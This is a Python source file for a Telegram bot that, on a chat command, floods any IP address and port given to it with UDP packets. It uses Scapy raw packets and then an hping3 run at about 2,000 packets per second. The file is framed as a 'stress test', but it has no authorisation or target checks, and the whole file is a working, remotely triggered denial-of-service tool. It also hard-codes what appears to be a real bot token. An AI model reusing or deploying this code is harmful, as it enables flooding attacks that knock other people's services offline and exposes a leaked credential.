import asyncio
import os
import logging
from subprocess import Popen, PIPE
from scapy.all import IP, UDP, Raw, send, conf
from telegram import Update
from telegram.ext import ApplicationBuilder, CommandHandler, ContextTypes

# Telegram Bot Token
TG_BOT_TOKEN = "7908068015:AAFucAomrbNoMAU2XZy1HgeMwuf9D0VtKZo"

# Configure Logging
logging.basicConfig(
    filename="udp_stress_advanced.log",
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s"
)

# Stop Flag
stop_test = False

# Ensure Scapy Works Without Errors
conf.verb = 0  # Suppress Scapy output

# Helper to Check Root Privileges
def check_root_privileges():
    if os.geteuid() != 0:
        logging.error("Script requires root privileges to send raw packets.")
        raise PermissionError("You must run this script as root (e.g., with sudo).")

# Traffic Generation Using Scapy
def send_scapy_packets(ip, port, packet_count):
    try:
        check_root_privileges()
        logging.info(f"Sending {packet_count} custom UDP packets to {ip}:{port}")
        for _ in range(packet_count):
            # Generate large payloads with a randomized Raw load for higher unpredictability
            payload = os.urandom(1024)  # 1KB random data payload
            packet = IP(dst=ip) / UDP(dport=port) / Raw(load=payload)
            send(packet, verbose=False)
    except Exception as e:
        logging.error(f"Scapy packet sending error: {e}")
        raise

# Run Traffic Generation Using hping3
def run_hping3(ip, port, packet_rate):
    try:
        logging.info(f"Starting hping3 stress test to {ip}:{port} at {packet_rate} packets/sec")
        command = [
            "hping3",
            "--udp",
            "-i", "u500",  # Send a packet every 500 microseconds (2,000 packets per second)
            "-d", "1024",  # 1KB payload size
            "-p", str(port),
            ip
        ]
        process = Popen(command, stdout=PIPE, stderr=PIPE)
        stdout, stderr = process.communicate()
        if process.returncode == 0:
            logging.info(f"hping3 Output: {stdout.decode('utf-8')}")
        else:
            logging.error(f"hping3 Error: {stderr.decode('utf-8')}")
    except FileNotFoundError:
        logging.error("hping3 not found. Install it using `sudo apt install hping3`.")
        raise FileNotFoundError("hping3 is not installed or accessible in the PATH.")
    except Exception as e:
        logging.error(f"hping3 execution error: {e}")
        raise

# Stress Test Function
async def udp_stress_test(ip, port, duration, packet_count, update: Update):
    global stop_test
    stop_test = False
    packets_sent = 0
    errors = 0

    await update.message.reply_text(f"UDP Stress Test Started on {ip}:{port} for {duration} seconds.")

    try:
        # Send packets with Scapy in bursts
        for _ in range(duration):  # Duration in seconds
            if stop_test:
                break

            send_scapy_packets(ip, port, packet_count // duration)
            packets_sent += packet_count // duration

            # Give the server time to process and simulate high load
            await asyncio.sleep(1)  # Sleep 1 second between bursts

    except Exception as e:
        errors += 1
        logging.error(f"Error during Scapy packet sending: {e}")
        await update.message.reply_text(f"Error during Scapy test: {e}")

    # Final Summary
    await update.message.reply_text(
        f"Test Completed: Total Packets Sent: {packets_sent}, Errors: {errors}. Check logs for detailed report."
    )
    logging.info(f"Final Summary - Total Packets Sent: {packets_sent}, Errors: {errors}")

    # Run additional stress using hping3
    await update.message.reply_text("Running additional stress test with hping3.")
    try:
        run_hping3(ip, port, packet_rate=2000)
    except Exception as e:
        await update.message.reply_text(f"hping3 Test Failed: {e}")

# Start Stress Test Command
async def start_udp_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_test
    stop_test = False  # Reset stop flag

    try:
        # Parse arguments
        ip = context.args[0]
        port = int(context.args[1])
        duration = int(context.args[2])
        packet_count = int(context.args[3])

        # Start UDP stress test with Scapy
        await update.message.reply_text(
            f"Starting UDP Stress Test on {ip}:{port} with {packet_count} packets over {duration} seconds."
        )
        await udp_stress_test(ip, port, duration, packet_count, update)

    except IndexError:
        await update.message.reply_text(
            "Usage: /start_udp_test <ip> <port> <duration_in_seconds> <packet_count>"
        )
    except ValueError:
        await update.message.reply_text("Invalid input. Ensure IP, port, and duration are correct.")
    except PermissionError as e:
        await update.message.reply_text(f"Permission Error: {e}")
    except Exception as e:
        await update.message.reply_text(f"An unexpected error occurred: {e}")

# Stop Stress Test Command
async def stop_udp_test(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global stop_test
    stop_test = True
    await update.message.reply_text("UDP Stress Test Stopped.")
    logging.info("UDP Stress Test Stopped by User.")

# Main Function
def main():
    app = ApplicationBuilder().token(TG_BOT_TOKEN).build()

    app.add_handler(CommandHandler("start_udp_test", start_udp_test))
    app.add_handler(CommandHandler("stop_udp_test", stop_udp_test))

    app.run_polling()

if __name__ == "__main__":
    main()